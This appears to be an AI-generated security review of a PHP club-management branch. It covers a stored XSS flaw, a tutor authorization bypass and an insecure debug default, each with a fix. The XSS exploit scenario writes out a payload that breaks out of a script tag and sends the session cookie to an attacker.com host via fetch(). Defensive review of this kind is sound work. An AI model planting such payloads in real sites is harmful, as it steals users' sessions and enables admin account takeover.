# Security Review Report — Branch `Youssef`

**Date:** 2026-04-03  
**Reviewer:** Automated Security Review (Claude Code)  
**Scope:** Changes introduced on branch `Youssef` compared to `main`  
**Method:** Static analysis of diff + targeted codebase exploration

---

## Executive Summary

Three confirmed vulnerabilities were found in this PR. Two are high severity and require fixes before merging to production. One is medium severity and should be addressed as part of the same release.

| # | Title | Severity | File | Confidence |
|---|-------|----------|------|------------|
| 1 | Stored XSS via `json_encode()` without HTML escaping flags | **HIGH** | `views/club/create.php:244`, `views/club/edit.php:185` | 9/10 |
| 2 | Authorization bypass — any tuteur can force-finalize any club | **HIGH** | `controllers/ValidationController.php:345–357` | 9/10 |
| 3 | Insecure default `APP_DEBUG=true` in `.env.example` | **MEDIUM** | `.env.example:20` | 9/10 |

---

## Vuln 1 — Stored XSS: `json_encode()` Without HTML Escaping Flags

**Severity:** High  
**Category:** Stored Cross-Site Scripting (XSS)  
**Files:**
- [views/club/create.php:244](views/club/create.php#L244)
- [views/club/edit.php:185](views/club/edit.php#L185)

### What the code does

Both pages embed a PHP array of users directly into a JavaScript variable using `json_encode()`. This is a common pattern for passing server-side data to client-side JS.

**`views/club/create.php` line 244:**
```php
var usersData = <?= json_encode(array_map(function($u) {
    return [
        'id'    => $u['id'],
        'name'  => $u['prenom'] . ' ' . $u['nom'],
        'email' => $u['mail'],
        'promo' => $u['promo'] ?? ''
    ];
}, $users ?? [])) ?>;
```

**`views/club/edit.php` line 185:**
```php
const users = <?= json_encode($users ?? []) ?>;
```

### Why it is vulnerable

`json_encode()` in PHP does **not** escape HTML special characters by default. In particular, it does not escape `<` and `>`, which means a value like:

```
</script><img src=x onerror=alert(document.cookie)>
```

...will be output verbatim inside the `<script>` block, immediately closing the tag and injecting arbitrary HTML into the page.

The data rendered here comes from the `users` table — specifically fields like `prenom`, `nom`, `mail`, and `promo`. These are set by users at registration time and are stored in the database, making this a **stored XSS** (also called persistent XSS): the payload is injected once and then executes for every subsequent victim who loads the page.

### Exploit scenario

1. Attacker registers with first name: `Foo</script><script>fetch('https://attacker.com/steal?c='+document.cookie)</script>`
2. This value is stored in the `users` table in the `prenom` column.
3. Any administrator or club president who visits the club creation page (`/club/create`) will load the page and trigger the injected script.
4. The script exfiltrates the victim's session cookie to the attacker's server.
5. The attacker uses that cookie to impersonate the victim — potentially an admin.

**Note:** Because administrators can also visit the club edit page, this vulnerability can lead to full admin account takeover.

### Root cause

PHP's `json_encode()` has a set of optional flags specifically designed for safe inline JavaScript embedding. Without them, the output is valid JSON but unsafe in an HTML context. The missing flags are:

| Flag | Effect |
|------|--------|
| `JSON_HEX_TAG` | Encodes `<` as `\u003C` and `>` as `\u003E` |
| `JSON_HEX_AMP` | Encodes `&` as `\u0026` |
| `JSON_HEX_APOS` | Encodes `'` as `\u0027` |
| `JSON_HEX_QUOT` | Encodes `"` as `\u0022` |

### Fix

Add the escaping flags to both `json_encode()` calls:

**`views/club/create.php` line 244:**
```php
var usersData = <?= json_encode(array_map(function($u) {
    return [
        'id'    => $u['id'],
        'name'  => $u['prenom'] . ' ' . $u['nom'],
        'email' => $u['mail'],
        'promo' => $u['promo'] ?? ''
    ];
}, $users ?? []), JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT) ?>;
```

**`views/club/edit.php` line 185:**
```php
const users = <?= json_encode($users ?? [], JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT) ?>;
```

With these flags, the malicious payload `</script>` becomes `\u003C/script\u003E` — valid JSON that JavaScript reads correctly as a string literal, but which cannot break out of the `<script>` block.

---

## Vuln 2 — Authorization Bypass: Any Tuteur Can Force-Finalize Any Club

**Severity:** High  
**Category:** Authorization Bypass / Business Logic Flaw  
**File:** [controllers/ValidationController.php:345–357](controllers/ValidationController.php#L345)

### Background

The application uses a three-party validation workflow for clubs: BDE approval, admin approval, and tuteur approval. Only when all three are recorded does `validation_finale` get set to `1`, unlocking the club. Each tuteur is assigned to specific clubs via the `fiche_club.tuteur` column.

### What the code does

When a tuteur approves a club (lines 345–357):

```php
if ($action === 'approve') {
    // Step 1 — guarded: only updates if this tuteur owns the club
    $this->db->prepare(
        "UPDATE fiche_club SET validation_tuteur = 1 WHERE club_id = ? AND tuteur = ?"
    )->execute([$club_id, $user_id]);

    // Step 2 — unguarded: checks bde + admin, then sets finale
    $check = $this->db->prepare(
        "SELECT validation_bde, validation_admin FROM fiche_club WHERE club_id = ?"
    );
    $check->execute([$club_id]);
    $status = $check->fetch(PDO::FETCH_ASSOC);

    if ($status && $status['validation_bde'] == 1 && $status['validation_admin'] == 1) {
        $this->db->prepare(
            "UPDATE fiche_club SET validation_finale = 1, motif_refus = NULL WHERE club_id = ?"
        )->execute([$club_id]);
        $success_msg = "Club approuvé définitivement.";
    }
}
```

### Why it is vulnerable

**Step 1** is correctly protected: the `WHERE club_id = ? AND tuteur = ?` clause means the `UPDATE` only modifies a row if the authenticated user is actually the assigned tuteur. If the user submits a `club_id` for a club they don't supervise, **Step 1 fails silently** — PDO executes without throwing an error and simply reports 0 rows affected.

**The code never checks the return value of Step 1.** Execution unconditionally continues to Step 2.

**Step 2** has two problems:
1. The `SELECT` query uses only `WHERE club_id = ?` — no tuteur ownership check.
2. The finale condition checks `validation_bde == 1 AND validation_admin == 1` but **does not check `validation_tuteur == 1`**. This means the tuteur's own approval is not required for the finalization to trigger.

### Exploit scenario

1. Attacker holds tuteur role (permission level 2), legitimately assigned to **Club A**.
2. **Club B** has BDE approval (`validation_bde = 1`) and admin approval (`validation_admin = 1`) but is still awaiting its assigned tuteur's approval (`validation_tuteur = 0`).
3. Attacker crafts a POST request to the validation endpoint with `club_id` = Club B's ID and `validate_club_tutor` action set to `approve`.
4. Step 1 silently fails (attacker is not Club B's tuteur). `validation_tuteur` remains `0`.
5. Step 2 fetches Club B's record, finds `validation_bde = 1` and `validation_admin = 1`, and sets `validation_finale = 1`.
6. **Club B is now permanently validated** — without its assigned tuteur ever approving it, and without the attacker having any legitimate authority over Club B.

### Fix

Two changes are needed:

1. **Check that Step 1 actually affected rows** before proceeding.
2. **Include `validation_tuteur` in the finale condition** so all three approvals are genuinely required.

```php
if ($action === 'approve') {
    $stmt = $this->db->prepare(
        "UPDATE fiche_club SET validation_tuteur = 1 WHERE club_id = ? AND tuteur = ?"
    );
    $stmt->execute([$club_id, $user_id]);

    // Only proceed if this tuteur actually owns the club
    if ($stmt->rowCount() > 0) {
        $check = $this->db->prepare(
            "SELECT validation_bde, validation_admin, validation_tuteur
             FROM fiche_club WHERE club_id = ?"
        );
        $check->execute([$club_id]);
        $status = $check->fetch(PDO::FETCH_ASSOC);

        // All three must be approved before finalizing
        if ($status
            && $status['validation_bde']    == 1
            && $status['validation_admin']  == 1
            && $status['validation_tuteur'] == 1
        ) {
            $this->db->prepare(
                "UPDATE fiche_club SET validation_finale = 1, motif_refus = NULL WHERE club_id = ?"
            )->execute([$club_id]);
            $success_msg = "Club approuvé définitivement.";
        } else {
            $success_msg = "Approbation tuteur enregistrée. En attente des autres signatures requises.";
        }
    } else {
        // Tuteur has no authority over this club
        $error_msg = "Action non autorisée.";
    }
}
```

---

## Vuln 3 — Insecure Default: `APP_DEBUG=true` in `.env.example`

**Severity:** Medium  
**Category:** Sensitive Data Exposure / Insecure Configuration Default  
**File:** [.env.example:.env.example#L20](.env.example)

### What changed in this PR

This PR changed line 20 of `.env.example` from:
```
APP_DEBUG=false             # Set to true only in development
```
to:
```
APP_DEBUG=true              # Set to true only in development
```

### Why it matters

`.env.example` is a template file. The standard developer workflow is:
```bash
cp .env.example .env
# fill in real credentials, then deploy
```

Developers following this workflow who forget to flip `APP_DEBUG` back to `false` will unknowingly deploy with debug mode enabled.

### What the debug page exposes

When `APP_DEBUG=true`, the error handler in [config/ErrorHandler.php](config/ErrorHandler.php) renders [views/errors/error_dev.php](views/errors/error_dev.php) for every unhandled exception. This page renders the following directly in the browser:

| Data exposed | Why it is dangerous |
|---|---|
| **Full `$_POST` contents** | Login and registration forms POST plaintext passwords — these would be visible in error responses |
| **Full `$_SESSION` contents** | Session user IDs, role data, auth state, and any temporary tokens stored during flows (e.g. password reset codes) |
| **Full `$_GET` contents** | Any tokens passed in query strings |
| **Source code excerpt** | 5 lines before and after the error, with the full absolute filesystem path |
| **Full stack trace** | Every function call with arguments, revealing internal application structure |
| **PHP version and memory stats** | Useful for targeted exploit development |

Note: the CSRF token is partially redacted (replaced with `[HIDDEN]`), but all other session keys are displayed in full.

### Exploit scenario

1. A developer copies `.env.example` to `.env` during setup on a staging server and forgets to change `APP_DEBUG=true`.
2. An attacker visits the login page and submits a malformed request (e.g. a very long password, or a request that triggers a database error).
3. The debug error page renders in the HTTP response, exposing the victim's `$_POST` array — including the `password` field in plaintext.
4. Attacker reads the debug page response and obtains any other user's credentials intercepted during the error window.

Even without an active victim, a single triggered error on the attacker's own session exposes full file paths, class hierarchy, and source code — significantly lowering the barrier for finding other vulnerabilities.

### Fix

Revert this change. Template files must always ship with the safest possible defaults so that accidental production deployments fail safely:

```diff
-APP_DEBUG=true              # Set to true only in development
+APP_DEBUG=false             # Set to true only in development
```

Developers who need debug output should explicitly opt in by editing their local `.env`. This is a one-character change for the developer but prevents a potentially critical misconfiguration in production.

---

## Findings Not Reported

The following potential issues were investigated and ruled out:

| Claim | Verdict | Reason |
|---|---|---|
| `trim()` on reset token creates hash bypass | False positive | Trimming user input before hashing is correct practice; `hash_equals()` is used for timing-safe comparison; token is cryptographically random |
| `==` instead of `===` for password confirmation | False positive | Attacker controls both operands; magic hash strings fail `validateStrongPassword()` checks (no uppercase/special char); no exploitable path exists |
| bcrypt hash stored in `$_SESSION` during registration | False positive | Hash is not reversible; stored temporarily and explicitly unset after user creation; requires local filesystem access to exploit |

---

## Recommendations Summary

| Priority | Action | File |
|---|---|---|
| **P0 — Fix before merge** | Add `JSON_HEX_TAG \| JSON_HEX_AMP \| JSON_HEX_APOS \| JSON_HEX_QUOT` flags to both `json_encode()` calls | `views/club/create.php:244`, `views/club/edit.php:185` |
| **P0 — Fix before merge** | Check `rowCount() > 0` after tuteur UPDATE; add `validation_tuteur` to finale condition | `controllers/ValidationController.php:345–357` |
| **P1 — Fix before release** | Revert `APP_DEBUG` default from `true` back to `false` in `.env.example` | `.env.example:20` |
